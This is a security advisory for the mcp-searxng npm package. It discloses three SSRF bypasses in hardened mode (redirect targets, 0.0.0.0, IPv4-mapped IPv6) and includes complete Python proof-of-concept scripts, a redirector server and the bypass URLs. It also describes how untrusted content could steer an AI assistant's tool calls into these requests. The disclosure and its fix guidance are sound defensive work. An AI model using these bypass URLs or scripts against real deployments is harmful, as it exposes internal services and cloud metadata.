# [M] SearXNG MCP Server: Additional hardened-mode SSRF bypasses

## Summary
Severity: Medium
Advisory: GHSA-wppf-h75h-6pm6
CVE: CVE-2026-54689
CWE: CWE-200, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-19
Source: https://github.com/advisories/GHSA-wppf-h75h-6pm6
Type: github-advisory

## Affected
- npm: `mcp-searxng` — affected >=0 <1.2.1

## Details
## Summary

`mcp-searxng` has a hardened-mode URL-reading feature intended to prevent `web_url_read` from reaching private or internal network resources.

PR #79 appears to address one SSRF class: hostnames that resolve to private or internal addresses under hardened mode. I tested PR #79 locally and confirmed that it blocks the DNS-resolves-to-loopback case.

However, several other hardened-mode SSRF bypasses still appear to remain:

1. Redirects from an allowed first-hop URL to a loopback/internal URL are followed without re-validating the redirect target.
2. `0.0.0.0` is not treated as an internal/special address.
3. IPv4-mapped IPv6 literals can bypass private-address checks after URL canonicalization.

With hardened mode enabled and private URLs not explicitly allowed, `web_url_read` was still able to fetch and return content from a local loopback sentinel service in all three cases.

## Tested configuration

```bash
MCP_HTTP_HARDEN=true
MCP_HTTP_ALLOW_PRIVATE_URLS unset
```

The MCP server was driven over stdio.

The test target was a harmless internal sentinel HTTP service bound to:

```text
127.0.0.1:6789
```

The sentinel response contained:

```text
INTERNAL_SECRET_DATA__mcp_searxng_ssrf_path2
```

## Relationship to PR #79

I tested PR #79 locally:

- PR: `fix(url-reader): block DNS-rebinding SSRF via socket-level lookup guard (CWE-918) #79`
- PR commit tested: `e55d28e7be6786a71cd7a0eaf13d3ec9d0b734d4`
- Base issue class: CWE-918 / SSRF in `web_url_read`
- Hardened mode: enabled

Observed results:

```text
Case                                         Result on PR #79
-------------------------------------------------------------
DNS hostname resolving to 127.0.0.1          blocked
0.0.0.0                                      BYPASS
[::ffff:127.0.0.1]                           BYPASS
redirect from non-private IP to 127.0.0.1    BYPASS
```

So PR #79 is a useful fix, but it does not fully close hardened-mode internal URL access.

## Root cause

### 1. Redirect targets are not re-validated

The URL policy appears to be applied to the initial URL, but redirect targets are followed by `fetch()` without applying the same policy to each hop.

A non-private attacker-controlled first-hop URL can respond with:

```http
302 Location: http://127.0.0.1:6789/secret
```

The request is then followed to loopback.

This is independent of DNS rebinding. Even if the initial host is a non-private IP literal, the redirect can still pivot to `127.0.0.1`.

### 2. `0.0.0.0` is not treated as internal

`0.0.0.0` is not currently blocked by the private IPv4 predicate. On Linux, connecting to `0.0.0.0:<port>` can reach a local service bound on loopback or wildcard interfaces.

In my test, this URL returned the sentinel from the local loopback service:

```text
http://0.0.0.0:6789/secret
```

### 3. IPv4-mapped IPv6 canonicalization bypass

The current IPv4-mapped IPv6 handling appears to expect a dotted-decimal tail such as:

```text
::ffff:127.0.0.1
```

However, Node's WHATWG URL parser canonicalizes:

```js
new URL("http://[::ffff:127.0.0.1]/").hostname
```

to:

```text
[::ffff:7f00:1]
```

As a result, regex logic that expects the dotted-decimal form can miss the private IPv4-mapped address.

In my test, this URL returned the loopback sentinel:

```text
http://[::ffff:127.0.0.1]:6789/secret
```

## Impact

This is a hardened-mode SSRF bypass.

The sentinel service in the PoC is intentionally local and harmless. It represents an internal-only service reachable from the MCP server host.

In real deployments, the same class of issue could allow `web_url_read` to reach:

- local admin panels bound to loopback;
- Redis, Elasticsearch, or other local HTTP-like services;
- internal HTTP APIs on private networks;
- service mesh endpoints;
- cloud metadata endpoints, depending on routing and environment.

This is especially relevant for MCP deployments because tool calls may be selected by an AI assistant. If untrusted content can influence tool use, it may be able to trigger `web_url_read` with one of these bypass URLs.

## Proof of Concept

### 1. Build the PR #79 branch

```bash
cd /home/exouser/Desktop
mkdir -p searxng_pr79_test
cd searxng_pr79_test

git clone --depth 1 \
  -b fix/cwe918-url-reader-ssrf-4676 \
  https://github.com/sebastiondev/mcp-searxng.git pr79

cd pr79
git rev-parse HEAD

npm install --no-audit --no-fund
npm run build

ls -l dist/index.js
```

Expected PR commit:

```text
e55d28e7be6786a71cd7a0eaf13d3ec9d0b734d4
```

### 2. Start an internal sentinel service

This service represents an internal-only HTTP service reachable from the MCP server host.

```bash
cat > /tmp/searxng_sentinel_server.py <<'PY'
#!/usr/bin/env python3
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 6789
SENTINEL = b"INTERNAL_SECRET_DATA__mcp_searxng_ssrf_path2"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"<html><body><h1>internal</h1><p>" + SENTINEL + b"</p></body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        sys.stderr.write("[sentinel %s] %s\n" % (PORT, fmt % args))

def serve_v4():
    HTTPServer(("127.0.0.1", PORT), H).serve_forever()

def serve_v6():
    try:
        import socket
        class HTTPServerV6(HTTPServer):
            address_family = socket.AF_INET6
        HTTPServerV6(("::1", PORT), H).serve_forever()
    except Exception as e:
        sys.stderr.write(f"[sentinel] IPv6 listener failed: {e}\n")

threading.Thread(target=serve_v4, daemon=True).start()
serve_v6()
PY

fuser -k 6789/tcp 6790/tcp 2>/dev/null || true
nohup python3 /tmp/searxng_sentinel_server.py 6789 >/tmp/searxng_sentinel.log 2>&1 &
sleep 1

curl -sS http://127.0.0.1:6789/secret
```

Expected output contains:

```text
INTERNAL_SECRET_DATA__mcp_searxng_ssrf_path2
```

### 3. PoC A: `0.0.0.0`

```bash
cat > /tmp/poc_0_0_0_0.py <<'PY'
#!/usr/bin/env python3
import json
import os
import subprocess
import time
import sys
from pathlib import Path

REPO = Path("/home/exouser/Desktop/searxng_pr79_test/pr79")
SERVER = REPO / "dist" / "index.js"
SENTINEL = "INTERNAL_SECRET_DATA__mcp_searxng_ssrf_path2"

ENV = {
    "MCP_HTTP_HARDEN": "true",
    "MCP_HTTP_AUTH_TOKEN": "poc-token",
    "MCP_HTTP_ALLOWED_ORIGINS": "http://localhost:9999",
}

def send(p, o):
    p.stdin.write((json.dumps(o) + "\n").encode())
    p.stdin.flush()

def recv(p, want_id, timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        line = p.stdout.readline()
        if not line:
            time.sleep(0.05)
            continue
        try:
            m = json.loads(line.decode())
        except Exception:
            continue
        if m.get("id") == want_id:
            return m
    raise TimeoutError()

def main():
    url = "http://0.0.0.0:6789/secret"
    print(f"[poc] hardened-mode read_url url = {url!r}")

    p = subprocess.Popen(
        ["node", str(SERVER)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=str(REPO),
        env={**os.environ, **ENV},
    )

    try:
        send(p, {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "poc", "version": "0"}
            }
        })
        recv(p, 1)

        send(p, {
            "jsonrpc": "2.0",
            "method": "notifications/initialized",
            "params": {}
        })

        send(p, {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {
                "name": "web_url_read",
                "arguments": {
                    "url": url,
                    "maxLength": 400
                }
            }
        })

        r = recv(p, 2)
    finally:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            p.kill()

    text = json.dumps(r).replace("\\\\_", "_").replace("\\_", "_")
    if SENTINEL in text:
        print("[poc] RESULT: BYPASS — sentinel returned")
        try:
            print("[poc] tool returned:", repr(r["result"]["content"][0]["text"][:200]))
        except Exception:
            pass
        sys.exit(0)

    print("[poc] RESULT: blocked / failed")
    print(json.dumps(r)[:500])
    sys.exit(1)

if __name__ == "__main__":
    main()
PY

python3 /tmp/poc_0_0_0_0.py
```

Observed:

```text
[poc] hardened-mode read_url url = 'http://0.0.0.0:6789/secret'
[poc] RESULT: BYPASS — sentinel returned
```

### 4. PoC B: IPv4-mapped IPv6

```bash
sed 's|http://0.0.0.0:6789/secret|http://[::ffff:127.0.0.1]:6789/secret|' \
  /tmp/poc_0_0_0_0.py > /tmp/poc_ipv4_mapped_ipv6.py

python3 /tmp/poc_ipv4_mapped_ipv6.py
```

Observed:

```text
[poc] hardened-mode read_url url = 'http://[::ffff:127.0.0.1]:6789/secret'
[poc] RESULT: BYPASS — sentinel returned
```

### 5. PoC C: redirect from a non-private first-hop address to loopback

This uses `198.51.100.1` as a safe local stand-in for a non-private attacker-controlled first-hop address.

```bash
sudo ip addr add 198.51.100.1/32 dev lo

cat > /tmp/redirector_public.py <<'PY'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:6789/secret")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *args, **kwargs):
        pass

HTTPServer(("198.51.100.1", 6790), H).serve_forever()
PY

fuser -k 6790/tcp 2>/dev/null || true
nohup python3 /tmp/redirector_public.py >/tmp/searxng_redirector_public.log 2>&1 &
sleep 1

curl -sSL http://198.51.100.1:6790/jump
```

The `curl` sanity check should return the internal sentinel.

Now run the MCP request:

```bash
sed 's|http://0.0.0.0:6789/secret|http://198.51.100.1:6790/jump|' \
  /tmp/poc_0_0_0_0.py > /tmp/poc_redirect_public_to_loopback.py

python3 /tmp/poc_redirect_public_to_loopback.py
```

Observed:

```text
[poc] hardened-mode read_url url = 'http://198.51.100.1:6790/jump'
[poc] RESULT: BYPASS — sentinel returned
```

### Cleanup

```bash
fuser -k 6789/tcp 6790/tcp 2>/dev/null || true
sudo ip addr del 198.51.100.1/32 dev lo 2>/dev/null || true
```

## Reproduction note

`NodeHtmlMarkdown` escapes `_` to `\_`, so the sentinel may appear in the MCP response as:

```text
INTERNAL\_SECRET\_DATA\_\_mcp\_searxng\_ssrf\_path2
```

When grepping or matching the response, either match against the escaped form or normalize `\_` back to `_`.

## Expected behavior

When hardened mode is enabled and private URLs are not explicitly allowed, `web_url_read` should not be able to fetch loopback or internal resources through:

- direct special-address literals;
- IPv4-mapped IPv6 literals;
- redirect chains;
- hostnames that resolve to private or internal addresses.

## Actual behavior

With hardened mode enabled, PR #79 blocks the DNS hostname case, but the following still return content from a loopback service:

```text
http://0.0.0.0:6789/secret
http://[::ffff:127.0.0.1]:6789/secret
http://198.51.100.1:6790/jump  -> 302 Location: http://127.0.0.1:6789/secret
```

## Suggested fix

A complete fix likely needs more than a connect-time DNS lookup guard.

Suggested changes:

- Re-validate every redirect hop. One option is to use `redirect: "manual"` and apply the same URL policy to each `Location` before following it.
- Treat `0.0.0.0/8` and other IANA special-purpose ranges as internal/non-public.
- Handle IPv4-mapped IPv6 after canonicalization, including forms such as `[::ffff:7f00:1]`.
- Apply private-address checks to IP literals directly, not only through DNS lookup hooks.
- Use an IP parsing library or byte-level address checks instead of regex-only IPv6 matching.
- Add regression tests for:
  - redirect to `127.0.0.1`;
  - `0.0.0.0`;
  - `[::ffff:127.0.0.1]`;
  - hostname resolving to `127.0.0.1`;
  - decimal IPv4 normalization remaining blocked.
```

## References
- https://github.com/ihor-sokoliuk/mcp-searxng/security/advisories/GHSA-wppf-h75h-6pm6
- https://github.com/ihor-sokoliuk/mcp-searxng
- https://github.com/ihor-sokoliuk/mcp-searxng/releases/tag/v1.2.1
